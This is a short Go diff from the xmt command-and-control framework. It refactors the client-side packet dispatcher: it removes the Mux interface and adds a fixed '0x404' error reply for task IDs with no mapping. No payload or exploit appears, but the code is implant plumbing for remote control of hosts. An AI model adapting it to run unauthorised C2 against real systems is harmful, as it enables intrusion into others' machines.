@@ -19,25 +19,6 @@ import (
 	"github.com/iDigitalFlame/xmt/util/xerr"
 )
 
-const ret404Tasks = false
-
-// DefaultClientMux is the default Session Mux instance that handles the default
-// C2 server and client functions.
-//
-// This operates cleanly with the default Server Mux instance.
-var DefaultClientMux = MuxFunc(defaultClientMux)
-
-// Mux is an interface that handles Packets when they arrive for Processing.
-type Mux interface {
-	Handle(*Session, *com.Packet) bool
-}
-
-// MuxFunc is the definition of a Mux Handler function.
-//
-// Once wrapped as a 'MuxFunc', these function aliases can be also used in place
-// of the Mux interface.
-type MuxFunc func(*Session, *com.Packet) bool
-
 func defaultClientMux(s *Session, n *com.Packet) bool {
 	if n.ID < task.MvRefresh {
 		return false
@@ -91,29 +72,17 @@ func defaultClientMux(s *Session, n *com.Packet) bool {
 		r.Clear()
 		r = nil
 	}
-	t := task.Mappings[n.ID]
-	if t == nil {
-		if cout.Enabled {
-			s.log.Warning("[%s/MuX] Received Packet ID 0x%X with no Task mapping!", s.ID, n.ID)
-		}
-		if ret404Tasks {
-			r := &com.Packet{ID: RvResult, Job: n.Job, Device: s.ID, Flags: com.FlagError}
-			r.WriteString("0x0")
-			s.queue(r)
-		}
-		return false
+	if t := task.Mappings[n.ID]; t != nil {
+		go executeTask(t, s, n)
+		return true
 	}
-	go executeTask(t, s, n)
-	return true
-}
-
-// Handle satisfies the Mux interface requirement and will process the received
-// Packet.
-//
-// This function allows Wrapped MuxFunc objects to be used directly in place of
-// more complex Mux definitions.
-func (m MuxFunc) Handle(s *Session, n *com.Packet) bool {
-	return m(s, n)
+	if cout.Enabled {
+		s.log.Warning("[%s/MuX] Received Packet ID 0x%X with no Task mapping!", s.ID, n.ID)
+	}
+	r := &com.Packet{ID: RvResult, Job: n.Job, Device: s.ID, Flags: com.FlagError}
+	r.WriteString("0x404")
+	s.queue(r)
+	return false
 }
 func executeTask(t task.Tasker, s *Session, n *com.Packet) {
 	if bugtrack.Enabled {
